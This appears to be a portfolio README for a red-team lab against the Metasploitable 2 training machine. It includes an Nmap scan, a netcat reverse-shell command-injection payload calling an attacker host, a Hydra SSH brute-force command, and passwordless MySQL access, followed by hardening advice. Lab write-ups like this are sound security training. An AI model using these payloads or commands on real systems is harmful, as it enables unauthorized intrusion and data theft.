# Red Team Tactics & Exploitation Lab  
*ctOS // Security Breach Simulation Reconstruction – Case RT-02*

[![Kali Linux](https://img.shields.io/badge/Node-Kali%20Linux-blue?logo=linux)]()
[![Metasploitable 2](https://img.shields.io/badge/Target-Metasploitable%202-red)]()
[![Metasploit](https://img.shields.io/badge/Framework-Metasploit-purple)]()
[![Nmap](https://img.shields.io/badge/Scanner-Nmap-lightgrey)]()
[![Hydra](https://img.shields.io/badge/Attack-Hydra-orange)]()
[![Category](https://img.shields.io/badge/Classification-Red%20Team-black)]()

---

```diff
============================================================
 ctOS SECURITY BREACH TERMINAL // RECONSTRUCTED LOG FEED
============================================================
+ Attacker Node: kali.lan
+ Target Asset : metasploitable-02.local
+ Status       : LINK ESTABLISHED
```

---

## ▓ TARGET PROFILE

```json
{
  "hostname": "metasploitable-02",
  "os": "Linux 2.6.24 (Legacy)",
  "exposure": "EXTREME",
  "role": "Vulnerable training node"
}
```

---

## ▓ OPERATION SUMMARY

A full-spectrum offensive intrusion was executed against **Metasploitable 2**, simulating an adversary infiltrating a poorly secured Linux system.  
This report reconstructs attacker actions, exploit chains, access paths, and resulting system compromise.

---

## ▓ WHY THIS PROJECT MATTERS

```diff
+ Demonstrates realistic adversarial intrusion patterns
+ Validates offensive methodology (recon → exploit → escalate)
+ Highlights insecure service configs and weak authentication
+ Produces actionable defensive intelligence
+ Reinforces secure hardening principles for Linux systems
```

---

## ▓ SERVICE DISCOVERY FEED (Nmap)

```bash
nmap -sV -O -p- 192.168.56.101
```

```diff
+ 22/tcp   open   ssh      (OpenSSH 4.7p1 - outdated)
+ 21/tcp   open   ftp      (VSFTPD 2.3.4 - backdoor)
+ 80/tcp   open   http     (Apache 2.2.8 - outdated)
+ 3306/tcp open   mysql    (default root credentials likely)
+ 139/tcp  open   smb      (anonymous access enabled)
+ 445/tcp  open   smb      (legacy mode)
```

**Assessment:**  
```diff
- Attack Surface Rating: EXTREME
```

---

## ▓ EXPLOITATION LOG (Core Events)

```diff
──────────────────────────────────────────────
 EVENT 01: WEB COMMAND INJECTION
──────────────────────────────────────────────
+ Vector: Vulnerable form parameter (HTTP)
+ Payload: ; nc -e /bin/bash attacker 4444
+ Reverse shell established
+ Privilege: user(msfadmin)
```

```diff
──────────────────────────────────────────────
 EVENT 02: SMB MISCONFIGURATION
──────────────────────────────────────────────
+ Anonymous access allowed
+ Sensitive share contents retrieved
- Significant credential exposure
```

```diff
──────────────────────────────────────────────
 EVENT 03: SSH BRUTE FORCE (HYDRA)
──────────────────────────────────────────────
+ hydra -l msfadmin -P rockyou.txt ssh://target
+ Valid password recovered
+ Unauthorized interactive shell obtained
```

```diff
──────────────────────────────────────────────
 EVENT 04: MYSQL BREACH
──────────────────────────────────────────────
+ Default root login accepted
+ Full database access granted
+ User tables + stored entries exfiltrated
```

```diff
──────────────────────────────────────────────
 EVENT 05: VULNERABLE SERVICES
──────────────────────────────────────────────
- Apache 2.2.8 → Multiple CVEs
- VSFTPD 2.3.4 → Backdoored version
- Samba (legacy) → Critical exposure
- OpenSSH outdated → Known exploit paths
```

---

## ▓ OPERATOR SKILLS VERIFIED

```diff
+ Network recon & enumeration
+ Vulnerability discovery & exploit selection
+ Manual & automated exploit deployment
+ Credential brute-force methodology
+ Privilege escalation & system mapping
+ Remediation-oriented reporting
```

---

## ▓ ATTACK WALKTHROUGH (EXPANDED)

<details>
<summary><strong>Click to open full sequence</strong></summary>

### Recon Phase
```bash
nmap -sV -p- 192.168.56.101
```
```diff
+ Multiple exploitable services identified
+ Proceeding to exploitation
```

### Exploitation → Reverse Shell
```diff
+ Command injection successful
+ Reverse shell opened on attacker node
```

### Credential Operations
```bash
hydra -l msfadmin -P rockyou.txt ssh://192.168.56.101
```
```diff
+ Password FOUND
+ SSH access obtained
```

### Database Compromise
```bash
mysql -u root -h 192.168.56.101
```
```diff
+ No password required
+ Full DB dump executed
```

### Post-Exploitation
```diff
+ Extracted password hashes
+ Mapped misconfigurations
+ Located escalation vectors
```

</details>

---

## ▓ DEFENSE RECOMMENDATIONS

```diff
- CRITICAL: Patch Apache, Samba, VSFTPD, OpenSSH immediately
- CRITICAL: Disable anonymous SMB/FTP access
- HIGH: Enforce MFA + strong SSH credentials
- HIGH: Lock down MySQL access & require secure passwords
- MEDIUM: Disable unnecessary services to reduce footprint
- MEDIUM: Implement firewall filtering (iptables/ufw)
+ OPTIONAL: Add IDS/alerting rules for exploit signatures
```

---

## ▓ END OF ctOS REPORT

```diff
+ Breach reconstruction complete
+ Log archived → /reports/reconstruction-rt02.log
```

---
